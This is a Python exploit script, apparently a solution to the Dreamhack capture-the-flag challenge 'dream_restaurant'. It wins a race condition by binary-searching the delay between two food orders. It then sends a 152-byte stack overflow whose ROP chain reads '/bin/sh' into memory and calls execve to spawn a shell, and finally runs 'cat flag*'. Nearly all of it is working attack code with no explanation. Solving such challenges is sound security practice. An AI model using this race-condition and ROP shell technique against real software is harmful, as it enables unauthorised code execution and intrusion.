#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time

exe = ptr.ELF("./dream_restaurant")
pwn.context.binary = pwn.ELF(exe.filepath)

remote = len(sys.argv) > 1 and sys.argv[1] == "remote"


def connect():
    if remote:
        return pwn.remote("host3.dreamhack.games", 17331)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    def sla(io, delim: bytes, data: bytes):
        io.sendlineafter(delim, data)
        return

    def sa(io, delim: bytes, data: bytes):
        io.sendafter(delim, data)
        return

    def sl(io, data: bytes):
        io.sendline(data)
        return

    def s(io, data: bytes):
        io.send(data)
        return

    def r(io, size: int) -> bytes:
        return io.recv(size)

    def ru(io, delim: bytes, drop: bool = False) -> bytes:
        return io.recvuntil(delim, drop=drop)

    def rl(io) -> bytes:
        return io.recvline()

    def order(io, name: bytes):
        sla(io, b"> ", b"1")
        sla(io, b"want? ", name)
        return

    def order_unrecv(io, name: bytes):
        sl(io, b"1")
        sl(io, name)
        return

    def quit(io, payload: bytes):
        sla(io, b"> ", b"3")
        sla(io, b"'? ", payload)
        return

    SOONDAE_GUKBAP = b"Soondae-gukbap"
    JJAMPPONG = b"Jjamppong"

    def make_race_condition():
        max_timing = 4
        min_timing = 0
        while True:
            io = connect()

            timing = (max_timing + min_timing) / 2
            ptr.logger.info(f"trying... {timing}")
            order(io, SOONDAE_GUKBAP)
            time.sleep(timing)
            order(io, JJAMPPONG)

            ru(io, b"Your dish has arrived!")
            ru(io, b"Your dish has arrived!")

            sl(io, b"2")
            ru(io, b"Your dish")
            line = rl(io)

            print(line)
            if b"noodle menu" in line:
                max_timing = timing
                ru(io, b"Food name: ")
                menu_name = rl(io).strip(b"\n")
                print(menu_name)
                if menu_name == SOONDAE_GUKBAP:
                    return io

            if b"rice menu" in line:
                min_timing = timing

            io.close()

    io = make_race_condition()

    syscall = next(exe.gadget("syscall; ret;"))
    ret = next(exe.gadget("ret;"))
    pop_rdi = next(exe.gadget("pop rdi; ret;"))
    pop_rsi = next(exe.gadget("pop rsi; ret;"))
    pop_rax_rdx_rbx = next(exe.gadget("pop rax; pop rdx; pop rbx; ret;"))
    bin_sh = 0x00000000004FC000

    payload = b""
    payload += b"A" * 152
    payload += ptr.p64(ret)
    payload += ptr.p64(pop_rdi)
    payload += ptr.p64(0)
    payload += ptr.p64(pop_rsi)
    payload += ptr.p64(bin_sh)
    payload += ptr.p64(pop_rax_rdx_rbx)
    payload += ptr.p64(0)
    payload += ptr.p64(0x18)
    payload += ptr.p64(0)
    payload += ptr.p64(syscall)

    payload += ptr.p64(pop_rdi)
    payload += ptr.p64(bin_sh)
    payload += ptr.p64(pop_rsi)
    payload += ptr.p64(0)
    payload += ptr.p64(pop_rax_rdx_rbx)
    payload += ptr.p64(59)
    payload += ptr.p64(0)
    payload += ptr.p64(0)
    payload += ptr.p64(syscall)

    assert b"\n" not in payload

    quit(io, payload)
    sl(io, b"/bin/sh\0")
    sl(io, b"cat flag*")

    io.interactive()
    return


if __name__ == "__main__":
    main()
